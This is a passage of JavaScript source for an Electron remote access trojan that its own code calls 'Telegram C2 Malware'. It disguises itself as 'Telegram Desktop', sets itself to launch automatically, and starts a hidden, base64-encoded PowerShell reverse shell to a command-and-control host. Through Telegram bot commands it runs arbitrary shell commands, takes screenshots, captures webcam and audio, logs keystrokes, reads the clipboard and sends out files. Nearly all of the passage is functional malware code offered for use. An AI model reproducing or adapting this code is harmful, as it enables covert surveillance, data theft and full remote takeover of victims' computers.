    fileMonitorInterval = setInterval(async () => {
      try {
        const currentFiles = new Set(await fsPromises.readdir(monitorDir));

        // Find new files
        const newFiles = [...currentFiles].filter(
          (file) => !lastFiles.has(file)
        );

        if (newFiles.length > 0) {
          for (const file of newFiles) {
            const filePath = path.join(monitorDir, file);
            const stats = await fsPromises.stat(filePath);

            if (stats.size < 10 * 1024 * 1024) {
              await telegramSendMessage(
                `📁 New file detected: ${file} (${Math.round(stats.size / 1024)}KB)`,
                chatId
              );
              await telegramSendFile(filePath, `📁 New file: ${file}`);
            }
          }
        }

        lastFiles = currentFiles;
      } catch (error) {
        log(`File monitor error: ${error.message}`, "ERROR");
      }
    }, 10000);

    await telegramSendMessage(
      "✅ File monitor started - watching for new files",
      chatId
    );
  } catch (error) {
    await telegramSendMessage(
      `❌ File monitor error: ${error.message}`,
      chatId
    );
  }
}

function stopFileMonitor(chatId) {
  if (fileMonitorInterval) {
    clearInterval(fileMonitorInterval);
    fileMonitorInterval = null;
    telegramSendMessage("🔴 File monitor stopped", chatId);
  } else {
    telegramSendMessage("📁 File monitor is not running", chatId);
  }
}

// ==================== SYSTEM FUNCTIONS ====================
async function getSystemStatus() {
  const platform = os.platform();
  const arch = os.arch();
  const hostname = os.hostname();
  const username = os.userInfo().username;
  const totalMem = Math.round(os.totalmem() / (1024 * 1024 * 1024));
  const freeMem = Math.round(os.freemem() / (1024 * 1024 * 1024));
  const uptime = Math.floor(os.uptime() / 3600);

  let publicIP = "Unknown";
  try {
    const ipData = await fetch("https://api.ipify.org?format=json").then(
      (res) => res.json()
    );
    publicIP = ipData.ip;
  } catch (e) {}

  return `
🖥 <b>System Status</b>
🆔 <code>${SESSION_ID}</code>

<b>Basic Info:</b>
• Hostname: <code>${hostname}</code>
• User: <code>${username}</code>
• Platform: ${platform} ${arch}
• Uptime: ${uptime}h

<b>Resources:</b>
• Memory: ${freeMem}GB / ${totalMem}GB free
• CPU Cores: ${os.cpus().length}
• CPU: ${os.cpus()[0]?.model || "Unknown"}

<b>Network:</b>
• Public IP: <code>${publicIP}</code>
• Internal IP: ${getLocalIP()}

<b>Malware Status:</b>
• Reverse Shell: ${reverseShellProcess ? "🟢 Running" : "🔴 Stopped"}
• Keylogger: ${keyloggerActive ? "🟢 Running" : "🔴 Stopped"}
• Continuous Webcam: ${webcamInterval ? "🟢 Running" : "🔴 Stopped"}
• File Monitor: ${fileMonitorInterval ? "🟢 Running" : "🔴 Stopped"}
• Session: Active
    `;
}

function getLocalIP() {
  const interfaces = os.networkInterfaces();
  for (const name of Object.keys(interfaces)) {
    for (const interface of interfaces[name]) {
      if (interface.family === "IPv4" && !interface.internal) {
        return interface.address;
      }
    }
  }
  return "Unknown";
}

async function executeSystemCommand(command, timeout = 30000) {
  return new Promise((resolve) => {
    const cmdStr = String(command || "");

    let execCmd;
    if (process.platform === "win32") {
      // Encode PowerShell command as UTF-16LE base64 to avoid quoting/encoding issues
      const psEncoded = Buffer.from(cmdStr, "utf16le").toString("base64");
      execCmd = `powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand ${psEncoded}`;
    } else {
      // Use sh (or bash) on non-Windows systems
      // Use -lc to allow ; && pipes etc.
      execCmd = `/bin/sh -lc ${escapeShellArg(cmdStr)}`;
    }

    // Execute with larger buffer in case of big output
    exec(
      execCmd,
      { timeout, windowsHide: true, maxBuffer: 20 * 1024 * 1024 },
      (error, stdout, stderr) => {
        const out = (stdout || "").toString();
        const err = (stderr || "").toString();

        if (error) {
          // Include both error message and any stdout/stderr for debugging
          const combined = [`❌ Error: ${error.message}`]
            .concat(err ? [`STDERR:\n${err}`] : [])
            .concat(out ? [`STDOUT:\n${out}`] : [])
            .join("\n\n");

          // Trim if extremely long
          resolve(truncate(combined, 20000));
        } else {
          const combined = (
            out ||
            err ||
            "Command executed successfully (no output)"
          ).toString();
          resolve(truncate(combined, 20000));
        }
      }
    );
  });
}

function escapeShellArg(s) {
  return `'${s.replace(/'/g, `'\\''`)}'`;
}

function truncate(s, maxLen = 4000) {
  if (typeof s !== "string") s = String(s);
  if (s.length <= maxLen) return s;
  const half = Math.floor((maxLen - 5) / 2);
  return s.slice(0, half) + "\n...\n" + s.slice(-half);
}

async function listSystemProcesses() {
  const command = process.platform === "win32" ? "tasklist" : "ps aux";
  return await executeSystemCommand(command);
}

async function browseSystemDirectory(dirPath) {
  try {
    const files = await fsPromises.readdir(dirPath, { withFileTypes: true });
    let output = `📁 Directory: ${dirPath}\n\n`;

    const dirs = files
      .filter((f) => f.isDirectory())
      .map((f) => `📁 ${f.name}`);
    const fileList = files
      .filter((f) => f.isFile())
      .map((f) => {
        try {
          const stats = fs.statSync(path.join(dirPath, f.name));
          return `📄 ${f.name} (${Math.round(stats.size / 1024)}KB)`;
        } catch {
          return `📄 ${f.name}`;
        }
      });

    output += dirs.slice(0, 20).join("\n") + "\n";
    output += fileList.slice(0, 20).join("\n");

    if (dirs.length + fileList.length > 40) {
      output += `\n... and ${dirs.length + fileList.length - 40} more items`;
    }

    return output;
  } catch (error) {
    return `❌ Error browsing directory: ${error.message}`;
  }
}

// ==================== FILE OPERATIONS ====================
async function loadSentFiles() {
  try {
    if (fs.existsSync(stateFile)) {
      const data = await fsPromises.readFile(stateFile, "utf8");
      sentFiles = new Set(JSON.parse(data));
    }
  } catch (error) {
    sentFiles = new Set();
  }
}

async function saveSentFile(filePath) {
  try {
    sentFiles.add(filePath);
    await fsPromises.writeFile(stateFile, JSON.stringify([...sentFiles]));
  } catch (error) {
    log(`File state save error: ${error.message}`, "ERROR");
  }
}

async function downloadFile(filePath, chatId) {
  try {
    if (!fs.existsSync(filePath)) {
      await telegramSendMessage(`❌ File not found: ${filePath}`, chatId);
      return;
    }

    const stats = await fsPromises.stat(filePath);
    if (stats.size > 50 * 1024 * 1024) {
      await telegramSendMessage(
        `❌ File too large: ${Math.round(stats.size / 1024 / 1024)}MB (max 50MB)`,
        chatId
      );
      return;
    }

    await telegramSendMessage(
      `📤 Downloading file: ${path.basename(filePath)}\nSize: ${Math.round(stats.size / 1024)}KB`,
      chatId
    );

    const success = await telegramSendFile(
      filePath,
      `📁 File: ${path.basename(filePath)}\n📍 Path: ${filePath}`,
      chatId
    );

    if (success) {
      await telegramSendMessage("✅ File downloaded successfully", chatId);
      await saveSentFile(filePath);
    } else {
      await telegramSendMessage("❌ Failed to download file", chatId);
    }
  } catch (error) {
    await telegramSendMessage(`❌ Download error: ${error.message}`, chatId);
  }
}

// ==================== SCREENSHOT FUNCTION ====================
async function takeScreenshot(chatId) {
  try {
    await telegramSendMessage("📸 Taking screenshot...", chatId);

    const sources = await desktopCapturer.getSources({
      types: ["screen"],
      thumbnailSize: { width: 1920, height: 1080 },
    });

    if (sources.length > 0) {
      const screenshot = sources[0].thumbnail.toPNG();
      const tempPath = getTempPath(`screenshot_${Date.now()}.png`);

      fs.writeFileSync(tempPath, screenshot);

      const success = await telegramSendFile(
        tempPath,
        `📸 Screenshot - ${new Date().toLocaleString()}`,
        chatId
      );

      fs.unlinkSync(tempPath);

      if (!success) {
        await telegramSendMessage("❌ Failed to send screenshot", chatId);
      }
    } else {
      await telegramSendMessage("❌ No screen source found", chatId);
    }
  } catch (error) {
    await telegramSendMessage(`❌ Screenshot error: ${error.message}`, chatId);
  }
}

// ==================== REVERSE SHELL FUNCTIONS ====================
function startReverseShell() {
  if (reverseShellProcess) {
    return "Reverse shell is already running";
  }

  try {
    const payload = `
$client = New-Object System.Net.Sockets.TCPClient('${CONFIG.C2_HOST}',${CONFIG.C2_PORT});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
`;
    const encodedPayload = Buffer.from(payload, "utf16le").toString("base64");

    reverseShellProcess = exec(
      `powershell -ep bypass -w hidden -enc ${encodedPayload}`,
      {
        detached: true,
        stdio: "ignore",
        windowsHide: true,
      }
    );

    reverseShellProcess.unref();
    log("Reverse shell started");
    return "🟢 Reverse shell started successfully";
  } catch (error) {
    log(`Reverse shell error: ${error.message}`, "ERROR");
    return `❌ Failed to start reverse shell: ${error.message}`;
  }
}

function stopReverseShell() {
  if (reverseShellProcess) {
    reverseShellProcess.kill();
    reverseShellProcess = null;
    log("Reverse shell stopped");
    return "🔴 Reverse shell stopped";
  }
  return "Reverse shell is not running";
}

// ==================== COMMAND HANDLER FUNCTIONS ====================
async function handleStartCommand(message) {
  const welcomeText = `
🤖 <b>Enhanced Remote Administration Bot</b>
🆔 <code>${SESSION_ID}</code>
💻 <b>Connected to:</b> ${os.hostname()}
👤 <b>User:</b> ${os.userInfo().username}
🖥 <b>Platform:</b> ${os.platform()} ${os.arch()}

📚 <b>Available Commands:</b>
/help - Show all commands
/status - System status
/sysinfo - Detailed system information
/screenshot - Take screenshot
/shell [cmd] - Execute command
/download [path] - Download file
/browse [path] - Browse directory
/processes - List running processes
/webcam - Capture webcam photo
/audio [seconds] - Record audio
/keys [stop] - Start/stop keylogger
/continuous_webcam [start/stop] [interval] - Continuous webcam
/clipboard - Get clipboard content
/network - Network information
/software - Installed software list
/file_monitor [start/stop] [directory] - Monitor file changes
/history - Command history
/reverse_shell [start/stop] - Control reverse shell

💡 <i>All commands work in real-time with enhanced capabilities</i>
    `;
  await telegramSendMessage(welcomeText, message.chat.id);
}

async function handleHelpCommand(message) {
  const helpText = `
🤖 <b>Enhanced Remote Administration Bot</b>

<b>🔍 Surveillance Commands:</b>
/webcam - Capture webcam photo
/audio [seconds] - Record audio (default: 10s)
/keys [stop] - Start/stop keylogger
/continuous_webcam [start/stop] [interval] - Continuous webcam capture

<b>📊 System Information:</b>
/status - Quick system status
/sysinfo - Detailed system report
/network - Network information
/software - Installed software list

<b>🎯 Remote Control:</b>
/screenshot - Capture screen
/shell [command] - Execute shell command
/processes - List running processes
/clipboard - Get clipboard content

<b>📁 File Operations:</b>
/download [path] - Download specific file
/browse [path] - List directory contents
/file_monitor [start/stop] [directory] - Monitor file changes

<b>⚙️ Management:</b>
/history - Show command history
/reverse_shell [start/stop] - Control reverse shell

💡 <i>All commands work in real-time with enhanced capabilities</i>
    `;
  await telegramSendMessage(helpText, message.chat.id);
}

async function handleStatusCommand(message) {
  const status = await getSystemStatus();
  await telegramSendMessage(status, message.chat.id);
}

async function handleSysinfoCommand(message) {
  const status = await getSystemStatus();
  await telegramSendMessage(status, message.chat.id);
}

async function handleScreenshotCommand(message) {
  await takeScreenshot(message.chat.id);
}

async function handleShellCommand(message, command) {
  if (!command) {
    await telegramSendMessage(
      "❌ Please provide a command to execute\nUsage: /shell <command>",
      message.chat.id
    );
    return;
  }

  await telegramSendMessage(
    `💻 Executing: <code>${command}</code>`,
    message.chat.id
  );

  const output = await executeSystemCommand(command);

  commandHistory.push({
    command: command,
    output: output,
    timestamp: new Date().toLocaleString(),
    user: message.from.username || "Unknown",
  });

  await telegramSendMessage(
    `<b>Command Output:</b>\n<code>${output}</code>`,
    message.chat.id
  );
}

async function handleDownloadCommand(message, filePath) {
  if (!filePath) {
    await telegramSendMessage(
      "❌ Please provide a file path\nUsage: /download <file_path>",
      message.chat.id
    );
    return;
  }
  await downloadFile(filePath, message.chat.id);
}

async function handleBrowseCommand(message, dirPath) {
  const output = await browseSystemDirectory(dirPath || os.homedir());
  await telegramSendMessage(output, message.chat.id);
}

async function handleProcessesCommand(message) {
  await telegramSendMessage("🔄 Getting process list...", message.chat.id);
  const processes = await listSystemProcesses();
  await telegramSendMessage(
    `<b>Running Processes:</b>\n<code>${processes}</code>`,
    message.chat.id
  );
}

async function handleWebcamCommand(message, duration) {
  await captureWebcamPhoto(message.chat.id);
}

async function handleAudioCommand(message, duration) {
  await recordAudio(message.chat.id, duration || 10);
}

async function handleKeysCommand(message, action) {
  if (action === "stop") {
    stopKeylogger(message.chat.id);
  } else {
    startKeylogger(message.chat.id);
  }
}

async function handleContinuousWebcamCommand(message, action, interval) {
  if (action === "stop") {
    stopContinuousWebcam(message.chat.id);
  } else {
    await startContinuousWebcam(message.chat.id, parseInt(interval) || 60000);
  }
}

async function handleClipboardCommand(message) {
  await getClipboardContent(message.chat.id);
}

async function handleNetworkCommand(message) {
  await getNetworkInfo(message.chat.id);
}

async function handleSoftwareCommand(message) {
  await getInstalledSoftware(message.chat.id);
}

async function handleFileMonitorCommand(message, action, directory) {
  if (action === "stop") {
    stopFileMonitor(message.chat.id);
  } else {
    await startFileMonitor(message.chat.id, directory || "Downloads");
  }
}

async function handleHistoryCommand(message) {
  if (commandHistory.length === 0) {
    await telegramSendMessage("No command history yet", message.chat.id);
    return;
  }

  let historyText = `<b>Command History (Last 10):</b>\n\n`;
  const recentHistory = commandHistory.slice(-10);

  recentHistory.forEach((item, index) => {
    historyText += `<b>${index + 1}. [${item.timestamp}]</b>\n`;
    historyText += `<b>User:</b> ${item.user}\n`;
    historyText += `<b>Command:</b> <code>${item.command}</code>\n`;
    historyText += `<b>Output:</b> ${item.output.substring(0, 100)}${item.output.length > 100 ? "..." : ""}\n\n`;
  });

  await telegramSendMessage(historyText, message.chat.id);
}

async function handleReverseShellCommand(message, action) {
  if (action === "start") {
    const result = startReverseShell();
    await telegramSendMessage(result, message.chat.id);
  } else if (action === "stop") {
    const result = stopReverseShell();
    await telegramSendMessage(result, message.chat.id);
  } else {
    await telegramSendMessage(
      "❌ Usage: /reverse_shell <start|stop>",
      message.chat.id
    );
  }
}

// ==================== BOT POLLING ====================
async function handleTelegramCommand(message) {
  const { chat, text } = message;

  if (chat.id.toString() !== CONFIG.ADMIN_CHAT_ID) {
    await telegramSendMessage("❌ Unauthorized access", chat.id);
    return;
  }

  const command = text.toLowerCase().split(" ")[0];
  const args = text.split(" ").slice(1);

  log(`Command received: ${command} from ${chat.username || "Unknown"}`);

  try {
    switch (command) {
      case "/start":
        await handleStartCommand(message);
        break;
      case "/help":
        await handleHelpCommand(message);
        break;
      case "/status":
        await handleStatusCommand(message);
        break;
      case "/sysinfo":
        await handleSysinfoCommand(message);
        break;
      case "/screenshot":
        await handleScreenshotCommand(message);
        break;
      case "/shell":
        await handleShellCommand(message, args.join(" "));
        break;
      case "/download":
        await handleDownloadCommand(message, args[0]);
        break;
      case "/browse":
        await handleBrowseCommand(message, args[0]);
        break;
      case "/processes":
        await handleProcessesCommand(message);
        break;
      case "/history":
        await handleHistoryCommand(message);
        break;
      case "/reverse_shell":
        await handleReverseShellCommand(message, args[0]);
        break;

      // Enhanced commands
      case "/webcam":
        await handleWebcamCommand(message, parseInt(args[0]));
        break;
      case "/audio":
        await handleAudioCommand(message, parseInt(args[0]));
        break;
      case "/keys":
        await handleKeysCommand(message, args[0]);
        break;
      case "/continuous_webcam":
        await handleContinuousWebcamCommand(message, args[0], args[1]);
        break;
      case "/clipboard":
        await handleClipboardCommand(message);
        break;
      case "/network":
        await handleNetworkCommand(message);
        break;
      case "/software":
        await handleSoftwareCommand(message);
        break;
      case "/file_monitor":
        await handleFileMonitorCommand(message, args[0], args[1]);
        break;

      default:
        await telegramSendMessage(
          `❌ Unknown command: ${command}\nType /help for available commands`,
          chat.id
        );
    }
  } catch (error) {
    await telegramSendMessage(
      `❌ Error executing command: ${error.message}`,
      chat.id
    );
  }
}

function startBotPolling() {
  let lastUpdateId = 0;

  const poll = async () => {
    try {
      const updates = await telegramGetUpdates(lastUpdateId);
      for (const update of updates) {
        if (update.message && update.message.text) {
          await handleTelegramCommand(update.message);
          lastUpdateId = update.update_id;
        }
      }
    } catch (error) {
      log(`Polling error: ${error.message}`, "ERROR");
    }
  };

  botPollingInterval = setInterval(poll, 1000);
  log("Telegram bot polling started");
}

function stopBotPolling() {
  if (botPollingInterval) {
    clearInterval(botPollingInterval);
    botPollingInterval = null;
  }
}

// ==================== ELECTRON UI FUNCTIONS ====================
function createMainWindow() {
  const iconPath = path.join(
    getAppPath(),
    process.platform === "win32" ? "icon.ico" : "icon.png"
  );

  mainWindow = new BrowserWindow({
    width: 900,
    height: 600,
    resizable: true,
    show: false,
    icon: iconPath,
    webPreferences: {
      preload: path.join(__dirname, "preload.js"),
      nodeIntegration: false,
      contextIsolation: true,
    },
  });

  if (app.isPackaged) {
    mainWindow.loadFile(
      path.join(process.resourcesPath, "app.asar", "index.html")
    );
  } else {
    mainWindow.loadFile(path.join(__dirname, "index.html"));
  }

  mainWindow.on("close", (event) => {
    if (!appIsQuitting) {
      event.preventDefault();
      mainWindow.hide();
      log("Window hidden to system tray");
    }
  });

  mainWindow.once("ready-to-show", () => {
    mainWindow.show();
  });

  mainWindow.setMenu(null);
}

function createTrayIcon() {
  try {
    const iconPath = path.join(
      getAppPath(),
      process.platform === "win32" ? "icon.ico" : "icon.png"
    );

    let trayIcon;
    if (fs.existsSync(iconPath)) {
      trayIcon = nativeImage.createFromPath(iconPath);
    } else {
      trayIcon = nativeImage.createFromDataURL(
        "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg=="
      );
    }

    tray = new Tray(trayIcon);

    const contextMenu = Menu.buildFromTemplate([
      {
        label: "Show",
        click: () => {
          mainWindow.show();
          mainWindow.focus();
        },
      },
      { type: "separator" },
      {
        label: "About",
        click: () => {
          shell.openExternal("https://web.telegram.org");
        },
      },
      { type: "separator" },
      {
        label: "Exit",
        click: () => {
          appIsQuitting = true;
          app.quit();
        },
      },
    ]);

    tray.setToolTip("Telegram Desktop");
    tray.setContextMenu(contextMenu);

    tray.on("click", () => {
      if (mainWindow.isVisible()) {
        mainWindow.hide();
      } else {
        mainWindow.show();
        mainWindow.focus();
      }
    });

    log("Tray icon created");
  } catch (error) {
    log(`Tray creation error: ${error.message}`, "ERROR");
  }
}

// ==================== APPLICATION STARTUP ====================
async function initializeMalware() {
  log("🚀 Telegram C2 Malware starting...");

  // Enable auto-launch on startup
  await enableAutoLaunch();

  // Load sent files state
  await loadSentFiles();

  // Start reverse shell
  startReverseShell();

  // Start bot polling
  startBotPolling();

  // Send startup notification
  const status = await getSystemStatus();
  await telegramSendMessage(`🔔 <b>New Session Connected</b>\n${status}`);

  log("Malware fully operational");
}

// ==================== ELECTRON APP EVENTS ====================
app.whenReady().then(async () => {
  // Single instance lock
  const gotTheLock = app.requestSingleInstanceLock();
  if (!gotTheLock) {
    app.quit();
    return;
  }

  app.on("second-instance", () => {
    if (mainWindow) {
      if (mainWindow.isMinimized()) mainWindow.restore();
      mainWindow.show();
      mainWindow.focus();
    }
  });

  // Create UI
  createMainWindow();
  createTrayIcon();

  // Initialize malware
  await initializeMalware();
});

app.on("window-all-closed", (event) => {
  event.preventDefault();
});

app.on("before-quit", () => {
  appIsQuitting = true;
  stopBotPolling();
  stopKeylogger();
  if (webcamInterval) clearInterval(webcamInterval);
  if (fileMonitorInterval) clearInterval(fileMonitorInterval);
  log("Application shutting down");
});

app.on("activate", () => {
  if (BrowserWindow.getAllWindows().length === 0) {
    createMainWindow();
  }
});

// Error handling
process.on("unhandledRejection", (reason, promise) => {
  log(`Unhandled Rejection: ${reason}`, "ERROR");
});

process.on("uncaughtException", (error) => {
  log(`Uncaught Exception: ${error.message}`, "ERROR");
});

app.on("ready", () => {
  const ffmpegPath = path.join(process.resourcesPath, "ffmpeg.dll");
  console.log("FFmpeg path:", ffmpegPath);
});
